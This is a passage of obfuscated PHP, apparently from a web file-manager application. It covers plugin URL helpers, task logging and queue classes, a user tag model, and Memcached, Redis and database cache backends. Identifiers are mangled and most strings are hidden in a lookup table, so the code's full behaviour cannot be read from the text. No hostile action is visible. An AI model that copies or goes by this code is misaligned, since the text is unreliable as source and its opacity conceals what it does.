onGetConfig($ªõÒÃİ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ôù­Êå‚) { if ($ôù­Êå‚ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($•Ú„÷ª  = "\160\x6c\165\147\151\x6e\x41\x75\164\x68") { $ÕÙÍŠ’ˆ =& $_SERVER[ªÏ§Ë·]; if (!Session::get($ÕÙÍŠ’ˆ[1547])) { return !1; } if (_get($GLOBALS, $ÕÙÍŠ’ˆ[532])) { return !0; } $³íù‰‰ = $this->getConfig(); if (!$³íù‰‰[$•Ú„÷ª ]) { return !1; } return ActionCall($ÕÙÍŠ’ˆ[1596], $³íù‰‰[$•Ú„÷ª ]); } public function url($âóèì€õ, $¿Ïó§ª™ = '', $Ç»ÍŞ¦§ = true) { $§¦êñô¼ =& $_SERVER[ªÏ§Ë·]; $ÌŠ¼¨ã‡ = $this->getConfig(); $Œª¤Â› = KOD_VERSION . $§¦êñô¼[10] . KOD_VERSION_BUILD; $À‡ÆºÑ¦ = $this->packageVersion(); $òÒ™­Ôî = $Œª¤Â› . $§¦êñô¼[424] . $À‡ÆºÑ¦; if (substr($âóèì€õ, 0, 4) == $§¦êñô¼[158] || substr($âóèì€õ, 0, 2) == $§¦êñô¼[1303]) { $»Ø±¸¸ = $âóèì€õ . $§¦êñô¼[1597] . $òÒ™­Ôî; } else { if ($¿Ïó§ª™ == $§¦êñô¼[12]) { $»Ø±¸¸ = $this->pluginHost . $âóèì€õ . $§¦êñô¼[1597] . $òÒ™­Ôî; } else { if ($¿Ïó§ª™ === $§¦êñô¼[85]) { $»Ø±¸¸ = $this->pluginHost . $âóèì€õ; } else { if ($¿Ïó§ª™ == $§¦êñô¼[1598]) { $»Ø±¸¸ = STATIC_PATH . $âóèì€õ . $§¦êñô¼[1597] . $Œª¤Â›; } else { if ($¿Ïó§ª™ == $§¦êñô¼[1599]) { $»Ø±¸¸ = APP_HOST . $§¦êñô¼[1600] . $âóèì€õ . $§¦êñô¼[1597] . $Œª¤Â›; } else { if (isset($ÌŠ¼¨ã‡[$¿Ïó§ª™])) { $»Ø±¸¸ = $ÌŠ¼¨ã‡[$¿Ïó§ª™] . $âóèì€õ . $§¦êñô¼[1597] . $òÒ™­Ôî; } } } } } } if (!$Ç»ÍŞ¦§) { return $»Ø±¸¸; } echo $»Ø±¸¸; } public function link($ËÏÖèé× = false, $¡ ¬ñöª = '') { $ØÈÑáÀ‘ =& $_SERVER[ªÏ§Ë·]; if (!$ËÏÖèé×) { $this->link($ØÈÑáÀ‘[1601], $ØÈÑáÀ‘[1599]); $this->link($ØÈÑáÀ‘[1602], $ØÈÑáÀ‘[1598]); $this->link($ØÈÑáÀ‘[1603], $ØÈÑáÀ‘[1598]); $this->link($ØÈÑáÀ‘[1604], $ØÈÑáÀ‘[1598]); $this->link($ØÈÑáÀ‘[1605], $ØÈÑáÀ‘[1598]); return; } $ƒë…ëˆ£ = $this->url($ËÏÖèé×, $¡ ¬ñöª, !1); if (substr($ËÏÖèé×, -3) == $ØÈÑáÀ‘[1606]) { echo $ØÈÑáÀ‘[1607] . $ƒë…ëˆ£ . $ØÈÑáÀ‘[1608] . $ØÈÑáÀ‘[19]; } else { if (substr($ËÏÖèé×, -4) == $ØÈÑáÀ‘[1609]) { echo $ØÈÑáÀ‘[1610] . $ƒë…ëˆ£ . $ØÈÑáÀ‘[1611] . $ØÈÑáÀ‘[19]; } } } } goto Añ§ó›‡ÒÎ; FŒæÎŒ›‹: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($€è‰®¸Ú, $»¾¨öòí = '', $¦àÁ—Í· = 0, $ËÎ…üÎ¿ = '') { $üŠ‚¿ © =& $_SERVER[ªÏ§Ë·]; $é²òÁô’ = new Task($€è‰®¸Ú, $»¾¨öòí, $¦àÁ—Í·, $ËÎ…üÎ¿); $GLOBALS[$üŠ‚¿ ©[1750] . $€è‰®¸Ú] = new TaskLog($üŠ‚¿ ©[1651], $é²òÁô’, $ËÎ…üÎ¿); return $é²òÁô’; } public function __construct($ƒ¢Õ­ôÔ = '', $Ê¼ı…Ã– = '', $ç¯Ü–€ = '') { $ÁÄ·•è¯ =& $_SERVER[ªÏ§Ë·]; if (!$ƒ¢Õ­ôÔ) { $ƒ¢Õ­ôÔ = $ÁÄ·•è¯[1651]; } $•®Š‘ù = $ƒ¢Õ­ôÔ . $ÁÄ·•è¯[424] . rand_string(10); if (!$ç¯Ü–€) { $ç¯Ü–€ = $ƒ¢Õ­ôÔ . $ÁÄ·•è¯[63] . $ç¯Ü–€; } switch ($ƒ¢Õ­ôÔ) { case $ÁÄ·•è¯[1651]: if (!$Ê¼ı…Ã– || !$Ê¼ı…Ã–->task) { return echoLog($ƒ¢Õ­ôÔ . $ÁÄ·•è¯[1751]); } $ğ§Ú•ò‡ = $Ê¼ı…Ã–; $•®Š‘ù = $ğ§Ú•ò‡->task[$ÁÄ·•è¯[437]]; $ƒ¢Õ­ôÔ = $ğ§Ú•ò‡->task[$ÁÄ·•è¯[437]]; if (!$ğ§Ú•ò‡->task[$ÁÄ·•è¯[1567]]) { $ğ§Ú•ò‡->task[$ÁÄ·•è¯[1567]] = $ç¯Ü–€ ? $ç¯Ü–€ : $ƒ¢Õ­ôÔ; } break; case $ÁÄ·•è¯[1752]: if (!$Ê¼ı…Ã–) { return echoLog($ƒ¢Õ­ôÔ . $ÁÄ·•è¯[1753]); } $µÛƒÙŠ = is_string($Ê¼ı…Ã–) ? array($Ê¼ı…Ã–) : $Ê¼ı…Ã–; $ğ§Ú•ò‡ = new TaskFileTransfer($•®Š‘ù, $ƒ¢Õ­ôÔ, 0, $ç¯Ü–€ ? $ç¯Ü–€ : $µÛƒÙŠ[0]); foreach ($µÛƒÙŠ as $³°“ìé) { $ğ§Ú•ò‡->addPath($³°“ìé); } break; case $ÁÄ·•è¯[351]: if (!$Ê¼ı…Ã–) { return echoLog($ƒ¢Õ­ôÔ . $ÁÄ·•è¯[1753]); } $µÛƒÙŠ = is_string($Ê¼ı…Ã–) ? array($Ê¼ı…Ã–) : $Ê¼ı…Ã–; $ğ§Ú•ò‡ = new TaskZip($•®Š‘ù, $ƒ¢Õ­ôÔ, 0, $ç¯Ü–€ ? $ç¯Ü–€ : $µÛƒÙŠ[0]); foreach ($µÛƒÙŠ as $³°“ìé) { $ğ§Ú•ò‡->addPath($³°“ìé); } break; case $ÁÄ·•è¯[1239]: if (!$Ê¼ı…Ã–) { return echoLog($ƒ¢Õ­ôÔ . $ÁÄ·•è¯[1753]); } $ğ§Ú•ò‡ = new TaskUnZip($•®Š‘ù, $ƒ¢Õ­ôÔ, 0, $ç¯Ü–€ ? $ç¯Ü–€ : $Ê¼ı…Ã–); if ($Ê¼ı…Ã–) { $ğ§Ú•ò‡->addFile($Ê¼ı…Ã–); } break; case $ÁÄ·•è¯[158]: $ğ§Ú•ò‡ = new TaskHttp($•®Š‘ù, $ƒ¢Õ­ôÔ); break; default: return; break; } $this->task = $ğ§Ú•ò‡; $this->taskID = $•®Š‘ù; Hook::bind($ÁÄ·•è¯[1688], array($this, $ÁÄ·•è¯[1754])); Hook::bind($ÁÄ·•è¯[1690], array($this, $ÁÄ·•è¯[1755])); Hook::bind($ÁÄ·•è¯[1684], array($this, $ÁÄ·•è¯[1756])); echoLog($ÁÄ·•è¯[1757] . $ğ§Ú•ò‡->task[$ÁÄ·•è¯[1567]]); } public function __destruct() { $this->end(); } public function end($ŠÌË¡û¨ = '') { $÷¦¸ÏÙÆ =& $_SERVER[ªÏ§Ë·]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ŠÌË¡û¨); $this->task = !1; $this->taskID = !1; Hook::unbind($÷¦¸ÏÙÆ[1688], array($this, $÷¦¸ÏÙÆ[1754])); Hook::unbind($÷¦¸ÏÙÆ[1690], array($this, $÷¦¸ÏÙÆ[1755])); Hook::unbind($÷¦¸ÏÙÆ[1684], array($this, $÷¦¸ÏÙÆ[1756])); } public function taskUpdate($ì©š¤æ) { $î´ß½ì˜ =& $_SERVER[ªÏ§Ë·]; if (!$ì©š¤æ || $this->taskID != $ì©š¤æ[$î´ß½ì˜[437]]) { return; } $´‡ö¸„µ = 20; $îü®š‹ = intval($ì©š¤æ[$î´ß½ì˜[1669]] * $´‡ö¸„µ); $¤âÈç÷Ö = $î´ß½ì˜[172] . str_repeat($î´ß½ì˜[909], $îü®š‹) . $î´ß½ì˜[1039] . str_repeat($î´ß½ì˜[63], $´‡ö¸„µ - $îü®š‹) . $î´ß½ì˜[174]; $ÍØÂê¬ = $¤âÈç÷Ö . sprintf($î´ß½ì˜[1758], $ì©š¤æ[$î´ß½ì˜[1669]] * 100) . $î´ß½ì˜[1759]; $››Ä¨şò = $ÍØÂê¬ . $ì©š¤æ[$î´ß½ì˜[1668]] . $î´ß½ì˜[8] . $ì©š¤æ[$î´ß½ì˜[814]] . LNG($î´ß½ì˜[1760]); $æã¨…Õå = $î´ß½ì˜[12]; if ($ì©š¤æ[$î´ß½ì˜[1744]]) { $››Ä¨şò = $ÍØÂê¬ . size_format($ì©š¤æ[$î´ß½ì˜[1668]]) . $î´ß½ì˜[8] . size_format($ì©š¤æ[$î´ß½ì˜[814]]); $æã¨…Õå = size_format($ì©š¤æ[$î´ß½ì˜[1670]]) . $î´ß½ì˜[1761]; } if ($ì©š¤æ[$î´ß½ì˜[1089]]) { $ì©š¤æ[$î´ß½ì˜[1718]] = $ì©š¤æ[$î´ß½ì˜[1089]] . $î´ß½ì˜[63] . $ì©š¤æ[$î´ß½ì˜[1718]]; } if ($ì©š¤æ[$î´ß½ì˜[1718]]) { $ËÖã—ç‘ = $î´ß½ì˜[12]; if ($ì©š¤æ[$î´ß½ì˜[1720]]) { $ËÖã—ç‘ = $î´ß½ì˜[60] . size_format($ì©š¤æ[$î´ß½ì˜[1721]]) . $î´ß½ì˜[8] . size_format($ì©š¤æ[$î´ß½ì˜[1720]]); } $æã¨…Õå .= $ì©š¤æ[$î´ß½ì˜[1718]] . $ËÖã—ç‘; } if ($ì©š¤æ[$î´ß½ì˜[791]] && !$ì©š¤æ[$î´ß½ì˜[1720]]) { $æã¨…Õå .= $î´ß½ì˜[63] . size_format($ì©š¤æ[$î´ß½ì˜[1725]]) . $î´ß½ì˜[8] . size_format($ì©š¤æ[$î´ß½ì˜[791]]); } echoLog($››Ä¨şò . $î´ß½ì˜[63] . $æã¨…Õå, !0); } public function taskEnd($‡òË…ª) { $ÂáÙ³†Ç =& $_SERVER[ªÏ§Ë·]; if (!$‡òË…ª || $this->taskID != $‡òË…ª[$ÂáÙ³†Ç[437]]) { return; } $ŞŸäàè = $‡òË…ª ? $‡òË…ª[$ÂáÙ³†Ç[1668]] . $ÂáÙ³†Ç[8] . $‡òË…ª[$ÂáÙ³†Ç[814]] . LNG($ÂáÙ³†Ç[1760]) . $ÂáÙ³†Ç[81] : $ÂáÙ³†Ç[12]; echoLog($ÂáÙ³†Ç[1762] . $‡òË…ª[$ÂáÙ³†Ç[1567]] . ($‡òË…ª[$ÂáÙ³†Ç[491]] ? $ÂáÙ³†Ç[81] . $‡òË…ª[$ÂáÙ³†Ç[491]] : $ÂáÙ³†Ç[12]) . $ÂáÙ³†Ç[81] . $ŞŸäàè . $ÂáÙ³†Ç[1763] . sprintf($ÂáÙ³†Ç[878], timeFloat() - $‡òË…ª[$ÂáÙ³†Ç[1671]]) . $ÂáÙ³†Ç[1683]); $this->end(); } public function taskKill($ùŞ­¼±‰) { $ú´°¨®ü =& $_SERVER[ªÏ§Ë·]; if (!$ùŞ­¼±‰ || $this->taskID != $ùŞ­¼±‰[$ú´°¨®ü[437]]) { return; } echoLog($ú´°¨®ü[1764] . $ùŞ­¼±‰[$ú´°¨®ü[1567]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\121\x75\145\x75\145\114\x65\156\147\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\x75\x65\165\145\x44\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($¦‘é²¦ò, $ƒÖø•ßó = array(), $„Œ‡ƒñ = '', $¾¿ÚÄÃé = '') { $¤ßÕ’µñ =& $_SERVER[ªÏ§Ë·]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¾¿ÚÄÃé && array_find_by_field(self::$listData, $¤ßÕ’µñ[104], $¾¿ÚÄÃé)) { return !0; } self::$listData[] = array($¤ßÕ’µñ[302] => $¦‘é²¦ò, $¤ßÕ’µñ[1765] => $ƒÖø•ßó, $¤ßÕ’µñ[491] => $„Œ‡ƒñ, $¤ßÕ’µñ[104] => $¾¿ÚÄÃé); return !0; } public static function addSubmit() { $‡îœ²èı =& $_SERVER[ªÏ§Ë·]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($‡îœ²èı[1766] . json_encode_force(array_to_keyvalue(self::$listData, $‡îœ²èı[12], $‡îœ²èı[491])), $‡îœ²èı[1767]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($úØõ”µÕ, $ï¡ŸÈÒû = array(), $çîçíÌ» = '', $İÊäˆ„œ = '') { $Œ”á— =& $_SERVER[ªÏ§Ë·]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ñÛù«¥Ñ = self::getAll(); if ($İÊäˆ„œ && array_find_by_field($ñÛù«¥Ñ, $Œ”á—[104], $İÊäˆ„œ)) { return !0; } $ñÛù«¥Ñ[] = array($Œ”á—[302] => $úØõ”µÕ, $Œ”á—[1765] => $ï¡ŸÈÒû, $Œ”á—[491] => $çîçíÌ», $Œ”á—[104] => $İÊäˆ„œ); write_log($Œ”á—[1766] . $çîçíÌ», $Œ”á—[1767]); self::setAll($ñÛù«¥Ñ); return !0; } public static function run() { $Ó§³ü¶Ë =& $_SERVER[ªÏ§Ë·]; $†„¼ƒ = self::getAll(); $ÁëÚİ¤» = array_shift($†„¼ƒ); if (!$ÁëÚİ¤») { return !1; } self::setAll($†„¼ƒ); $½‘úö—á = timeFloat(); $ç¸÷Úõ = $Ó§³ü¶Ë[12]; try { $ç¸÷Úõ = Hook::apply($ÁëÚİ¤»[$Ó§³ü¶Ë[302]], $ÁëÚİ¤»[$Ó§³ü¶Ë[1765]]); } catch (Exception $¾ Ü‰¬ˆ) { } $€ˆ¢µ•¼ = number_format(timeFloat() - $½‘úö—á, 3) . $Ó§³ü¶Ë[1683]; if ($ç¸÷Úõ && is_string($ç¸÷Úõ)) { $€ˆ¢µ•¼ = $€ˆ¢µ•¼ . $Ó§³ü¶Ë[1768] . $ç¸÷Úõ; } write_log($Ó§³ü¶Ë[1769] . $ÁëÚİ¤»[$Ó§³ü¶Ë[491]] . $Ó§³ü¶Ë[1770] . $€ˆ¢µ•¼, $Ó§³ü¶Ë[1767]); return !0; } public static function count() { $Šœ¬‘ï = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Šœ¬‘ï) { return 0; } return intval($Šœ¬‘ï); } public static function getAll() { $‹¤Ë…˜‚ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$‹¤Ë…˜‚) { return array(); } return $‹¤Ë…˜‚; } public static function setAll($’î¸æöŠ) { $Òà¯şè = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($’î¸æöŠ), $Òà¯şè); Cache::set(self::QUEUE_DATA, $’î¸æöŠ, $Òà¯şè); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÀùÉşöÖ, $ğ¦§‘¢Ä = 5.0) { if (!$ÀùÉşöÖ) { return; } $İŞääû† = Cache::get($ÀùÉşöÖ); if (!$İŞääû† || timeFloat() - floatVal($İŞääû†) >= $ğ¦§‘¢Ä) { Cache::set($ÀùÉşöÖ, timeFloat(), $ğ¦§‘¢Ä * 10); return !0; } return !1; } public static function timeLimitCall($÷‚¿¾Íá, $’ä©–Ì©, $ôá¢¨‚”, $ü™Õ¥¨ = 5.0) { $ó”¾œ­» =& $_SERVER[ªÏ§Ë·]; if (!$÷‚¿¾Íá || !$’ä©–Ì©) { return; } self::$asyncAdd = !0; $ƒĞÑÆ—¼ = $ó”¾œ­»[1771]; $Ñ–ø·“Í = Cache::get($ƒĞÑÆ—¼, !0); $ÄÖã—Á = array($ó”¾œ­»[1772] => timeFloat(), $ó”¾œ­»[1773] => timeFloat(), $ó”¾œ­»[302] => $’ä©–Ì©, $ó”¾œ­»[1765] => $ôá¢¨‚”, $ó”¾œ­»[190] => $ü™Õ¥¨); if (is_array($Ñ–ø·“Í[$÷‚¿¾Íá])) { $ÄÖã—Á[$ó”¾œ­»[1773]] = $Ñ–ø·“Í[$÷‚¿¾Íá][$ó”¾œ­»[1773]]; } if (is_array($Ñ–ø·“Í[$÷‚¿¾Íá])) { if (timeFloat() - $Ñ–ø·“Í[$÷‚¿¾Íá][$ó”¾œ­»[1772]] < $ÄÖã—Á[$ó”¾œ­»[190]] * 0.3) { return; } $ÄÖã—Á[$ó”¾œ­»[1773]] = $Ñ–ø·“Í[$÷‚¿¾Íá][$ó”¾œ­»[1773]]; } $Ñ–ø·“Í[$÷‚¿¾Íá] = $ÄÖã—Á; Cache::set($ƒĞÑÆ—¼, $Ñ–ø·“Í, 60); Cache::removeMemory($ƒĞÑÆ—¼); write_log($ó”¾œ­»[1774] . $÷‚¿¾Íá . $ó”¾œ­»[81] . $’ä©–Ì©, $ó”¾œ­»[1767]); } public static function timeLimitCallLoop() { $÷Ñáá”í =& $_SERVER[ªÏ§Ë·]; $”Êºçİ = array($÷Ñáá”í[1775]); $Æ¬Ê´Í¥ = in_array(strtolower(ACTION), $”Êºçİ); if (!$Æ¬Ê´Í¥ && !self::$asyncAdd) { return; } $êÅ€˜é‡ = $÷Ñáá”í[1771]; $ˆÁÔÍäÈ = Cache::get($êÅ€˜é‡, !0); if (!$ˆÁÔÍäÈ || count($ˆÁÔÍäÈ) <= 0) { return; } $üƒƒ…àÊ = !1; $· ÖºÇ¶ = timeFloat(); $¦ªÃ§Éµ = array(); foreach ($ˆÁÔÍäÈ as $ŠŒ÷¨›ú => $¢òÛà») { if ($· ÖºÇ¶ - $¢òÛà»[$÷Ñáá”í[1773]] > $¢òÛà»[$÷Ñáá”í[190]]) { $üƒƒ…àÊ = !0; try { Hook::apply($¢òÛà»[$÷Ñáá”í[302]], $¢òÛà»[$÷Ñáá”í[1765]]); write_log($÷Ñáá”í[1776] . $ŠŒ÷¨›ú . $÷Ñáá”í[81] . $¢òÛà»[$÷Ñáá”í[302]] . $÷Ñáá”í[1777] . ACTION, $÷Ñáá”í[1767]); } catch (Exception $êÓâ²Õô) { } continue; } $¦ªÃ§Éµ[$ŠŒ÷¨›ú] = $¢òÛà»; } if (!$üƒƒ…àÊ) { return; } if (!$¦ªÃ§Éµ) { return Cache::remove($êÅ€˜é‡); } Cache::set($êÅ€˜é‡, $¦ªÃ§Éµ, 60); Cache::removeMemory($êÅ€˜é‡); } public static function finished($®Êüßà, $õæ°öõ²) { $å©úò¤à =& $_SERVER[ªÏ§Ë·]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($å©úò¤à[302] => $®Êüßà, $å©úò¤à[1765] => $õæ°öõ²); } private static function finishedRun() { $Óé¨‡ =& $_SERVER[ªÏ§Ë·]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ó¡èÔ®Ô) { try { Hook::apply($ó¡èÔ®Ô[$Óé¨‡[302]], $ó¡èÔ®Ô[$Óé¨‡[1765]]); } catch (Exception $•Ã°Áü) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto E®”Â’ …Á; DÔ¬‚öƒØ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\x61\x67\x4c\x69\x73\x74"; public $modelType = "\x55\163\145\162\x4f\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\155\145", "\163\164\171\154\145", "\163\157\162\x74"); public function listData($Õ°ïŠ¯İ = false, $åášØ„Ï = "\163\x6f\162\x74", $Ú½•ÔÀ = false) { return parent::listData($Õ°ïŠ¯İ, $åášØ„Ï, $Ú½•ÔÀ); } public function remove($‹ß‚ «) { return parent::remove($‹ß‚ «); } public function add($ãÊØÕ«†, $ßâÆ÷ˆ‚ = "\x6c\x61\x62\x65\x6c\x2d\147\x72\145\x79\55\x6e\157\x72\x6d\141\x6c") { $ã¤½§ù =& $_SERVER[ªÏ§Ë·]; if ($this->findByName($ãÊØÕ«†)) { return !1; } $ˆªá¢æâ = array($ã¤½§ù[458] => $ãÊØÕ«†, $ã¤½§ù[522] => $ßâÆ÷ˆ‚, $ã¤½§ù[1861] => $this->getSort($ã¤½§ù[296]) + 1); return parent::insert($ˆªá¢æâ); } public function update($…´‘½–ä, $êâ÷Ä°) { $·óºÌƒÙ =& $_SERVER[ªÏ§Ë·]; $§¯¡ôÉë = $this->listData($…´‘½–ä); $öîşªª– = $this->findByName($êâ÷Ä°[$·óºÌƒÙ[42]]); if (!$§¯¡ôÉë || $öîşªª– && $öîşªª–[$·óºÌƒÙ[437]] != $§¯¡ôÉë[$·óºÌƒÙ[437]]) { return !1; } return parent::update($…´‘½–ä, $êâ÷Ä°); } public function moveTop($íÅ¿ïü‘) { $Öê§îáÅ =& $_SERVER[ªÏ§Ë·]; $£ †×µ¥ = parent::listData(); $ÂÙíÊ¢ = $this->getSort($Öê§îáÅ[295]); foreach ($£ †×µ¥ as &$«ş°œÃß) { if ($«ş°œÃß[$Öê§îáÅ[437]] == $íÅ¿ïü‘) { $«ş°œÃß[$Öê§îáÅ[1881]] = $ÂÙíÊ¢; continue; } $«ş°œÃß[$Öê§îáÅ[1881]] += 1; } unset($«ş°œÃß); return parent::resetData($£ †×µ¥); } public function moveBottom($¨–ä§‡ı) { $ú±°ö’ =& $_SERVER[ªÏ§Ë·]; $–™ï»µ = $this->getSort($ú±°ö’[296]) + 1; return parent::update($¨–ä§‡ı, array($ú±°ö’[1881] => $–™ï»µ)); } public function resetSort($š‡áı è) { $äÀï¡ÍÈ =& $_SERVER[ªÏ§Ë·]; $Â‹¯ëÚ² = array(); $š‡áı è = is_array($š‡áı è) ? $š‡áı è : array(); for ($²Ó«şã = 0; $²Ó«şã < count($š‡áı è); $²Ó«şã++) { $Â‹¯ëÚ²[$š‡áı è[$²Ó«şã] . $äÀï¡ÍÈ[12]] = $²Ó«şã + 1; } $¢¸âªÙ– = parent::listData(); foreach ($¢¸âªÙ– as &$ÓáÈØ¹ø) { $Ò©ö±âæ = $Â‹¯ëÚ²[$ÓáÈØ¹ø[$äÀï¡ÍÈ[437]]]; $ÓáÈØ¹ø[$äÀï¡ÍÈ[1881]] = $Ò©ö±âæ ? $Ò©ö±âæ : $ÓáÈØ¹ø[$äÀï¡ÍÈ[1881]]; } unset($ÓáÈØ¹ø); return parent::resetData($¢¸âªÙ–); } private function getSort($ÌˆĞ‘ÉĞ) { $ğ¾·¬¬¤ =& $_SERVER[ªÏ§Ë·]; $±…¸È³Ù = parent::listData(); $Åª¿Ø±Ø = array_to_keyvalue($±…¸È³Ù, $ğ¾·¬¬¤[12], $ğ¾·¬¬¤[1881]); if (!$Åª¿Ø±Ø) { $Åª¿Ø±Ø = array(0); } $ã ëÂşº = $ÌˆĞ‘ÉĞ == $ğ¾·¬¬¤[296] ? max($Åª¿Ø±Ø) : min($Åª¿Ø±Ø); return intval($ã ëÂşº); } } goto CÉİšËùà; Cµ·ÅŒÀ¦†: define($_SERVER[ªÏ§Ë·][276], 1); define($_SERVER[ªÏ§Ë·][277], 2); define($_SERVER[ªÏ§Ë·][278], 3); goto b¿ªã„âµÎ; DŸò©Ç¿ˆ¦: class CacheLockDatabase { public function lock($ğ‰¤¬¾‚, $—ø¸ôîº = 0) { $åš¥Â·¸ = Model($_SERVER[ªÏ§Ë·][857]); $êûÒãÕ = microtime(!0) + $—ø¸ôîº; while (microtime(!0) < $êûÒãÕ) { $ø³îÒı = $åš¥Â·¸->get($ğ‰¤¬¾‚); if (!$ø³îÒı || $ø³îÒı < microtime(!0)) { $ñ•®£åâ = $åš¥Â·¸->set($ğ‰¤¬¾‚, $êûÒãÕ); if ($ñ•®£åâ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($˜ı°¤³Ê) { return Model($_SERVER[ªÏ§Ë·][857])->get($˜ı°¤³Ê); } public function unlock($‡íö®‚«) { Model($_SERVER[ªÏ§Ë·][857])->remove($‡íö®‚«); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Î°÷¸¸Î, $ŞïÑœ ›) { $É»¾‚»ç =& $_SERVER[ªÏ§Ë·]; if (!class_exists($É»¾‚»ç[894])) { show_json($É»¾‚»ç[895], !1); } $this->cacheTime = $ŞïÑœ ›; $this->handle = new Memcached(); if (is_array($Î°÷¸¸Î[$É»¾‚»ç[896]]) && count($Î°÷¸¸Î[$É»¾‚»ç[896]]) >= 1) { foreach ($Î°÷¸¸Î[$É»¾‚»ç[896]] as $ô›³°Úé) { $ø†àã£ = explode($É»¾‚»ç[4], $ô›³°Úé); $this->handle->addServer($ø†àã£[0], $ø†àã£[1]); } } else { $this->handle->addServer($Î°÷¸¸Î[$É»¾‚»ç[192]], $Î°÷¸¸Î[$É»¾‚»ç[193]]); } } public function set($ÚÊ­»Ã, $…°¹ìç, $²ğº§Ã = false) { $²ğº§Ã = $²ğº§Ã ? $²ğº§Ã : $this->cacheTime; return $this->handle->set($ÚÊ­»Ã, $…°¹ìç, $²ğº§Ã); } public function get($—¥àè°¹) { return $this->handle->get($—¥àè°¹); } public function remove($µúäåş¹) { return $this->handle->delete($µúäåş¹); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÀÓ‡ÎôÒ, $Ğã›èºé) { $—¸ÍëäĞ =& $_SERVER[ªÏ§Ë·]; if (!class_exists($—¸ÍëäĞ[897])) { show_json($—¸ÍëäĞ[898], !1); } $this->cacheTime = $Ğã›èºé; $â¤¤çÀû = isset($ÀÓ‡ÎôÒ[$—¸ÍëäĞ[899]]) ? $ÀÓ‡ÎôÒ[$—¸ÍëäĞ[899]] : 10; $ò£ñ¶¯ = _get($ÀÓ‡ÎôÒ, $—¸ÍëäĞ[896]); if ($ò£ñ¶¯ && is_array($ò£ñ¶¯)) { $this->initCluster($ÀÓ‡ÎôÒ, $â¤¤çÀû); } else { $this->handle = $this->init($ÀÓ‡ÎôÒ, $â¤¤çÀû); } } private function init($åâ°øÒ§, $Íà£¡ÄÌ) { $åºäìÁØ =& $_SERVER[ªÏ§Ë·]; $¾ŸßÍ¯õ = new Redis(); $Ğ»¨‡Ñ¿ = isset($åâ°øÒ§[$åºäìÁØ[900]]) ? $åâ°øÒ§[$åºäìÁØ[900]] : !1; if ($Ğ»¨‡Ñ¿) { $¾ŸßÍ¯õ->pconnect($åâ°øÒ§[$åºäìÁØ[192]], $åâ°øÒ§[$åºäìÁØ[193]], $Íà£¡ÄÌ); } else { $¾ŸßÍ¯õ->connect($åâ°øÒ§[$åºäìÁØ[192]], $åâ°øÒ§[$åºäìÁØ[193]], $Íà£¡ÄÌ); } if (!empty($åâ°øÒ§[$åºäìÁØ[451]])) { $¾ŸßÍ¯õ->auth($åâ°øÒ§[$åºäìÁØ[451]]); } if (!empty($åâ°øÒ§[$åºäìÁØ[785]]) && $åâ°øÒ§[$åºäìÁØ[785]] != 0) { $¾ŸßÍ¯õ->select($åâ°øÒ§[$åºäìÁØ[785]]); } return $¾ŸßÍ¯õ; } private function initCluster($ÏÚı´ø°, $İüµÀÖ) { $§¥¤²ÅÆ =& $_SERVER[ªÏ§Ë·]; $ŠÌ¥÷ÌÆ = array($§¥¤²ÅÆ[901], $§¥¤²ÅÆ[902], $§¥¤²ÅÆ[903]); $äÉæË© = $§¥¤²ÅÆ[901]; if (isset($ÏÚı´ø°[$§¥¤²ÅÆ[26]]) && in_array($ÏÚı´ø°[$§¥¤²ÅÆ[26]], $ŠÌ¥÷ÌÆ)) { $äÉæË© = $ÏÚı´ø°[$§¥¤²ÅÆ[26]]; } switch ($äÉæË©) { case $§¥¤²ÅÆ[901]: $this->_slave($ÏÚı´ø°, $İüµÀÖ); break; case $§¥¤²ÅÆ[902]: break; case $§¥¤²ÅÆ[903]: $this->isCluster = !0; $¾ÙÀß†Ô = $ÏÚı´ø°[$§¥¤²ÅÆ[896]]; $øø ï€Å = isset($ÏÚı´ø°[$§¥¤²ÅÆ[900]]) ? $ÏÚı´ø°[$§¥¤²ÅÆ[900]] : !1; $üòüæ³ã = isset($ÏÚı´ø°[$§¥¤²ÅÆ[451]]) ? $ÏÚı´ø°[$§¥¤²ÅÆ[451]] : null; $this->handle = new RedisCluster(NUll, $¾ÙÀß†Ô, $İüµÀÖ, $İüµÀÖ, $øø ï€Å, $üòüæ³ã); break; default: break; } } private function _slave($¹ÎÑáó˜, $²ÅõÚû©) { $÷ğ¼¯šÑ = $¹ÎÑáó˜[$_SERVER[ªÏ§Ë·][896]]; $this->filterConfig($¹ÎÑáó˜, $÷ğ¼¯šÑ[0]); $this->handle = $this->init($¹ÎÑáó˜, $²ÅõÚû©); unset($÷ğ¼¯šÑ[0]); if (empty($÷ğ¼¯šÑ)) { return; } $ÁÇŒß¥ö = array_rand($÷ğ¼¯šÑ); $this->filterConfig($¹ÎÑáó˜, $÷ğ¼¯šÑ[$ÁÇŒß¥ö]); $this->slaveHandle = 